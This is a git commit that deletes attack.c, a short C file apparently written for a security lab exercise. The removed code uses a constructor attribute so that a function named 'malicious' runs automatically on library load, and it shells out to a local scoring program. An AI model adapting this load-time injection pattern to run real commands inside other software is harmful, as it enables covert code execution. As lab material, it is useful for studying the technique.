017e0c6ef4ec6940f57db3f25cd1c8ddb7dba00d
smidtbx8 <77924124+smidtbx8@users.noreply.github.com>
2021-01-25 08:22:14 +0100

    Delete attack.c

--- attack.c
+++
@@ -1,9 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 8e16383b-6bbb-4b1f-a8f9-53831d555e7e");
-}
-
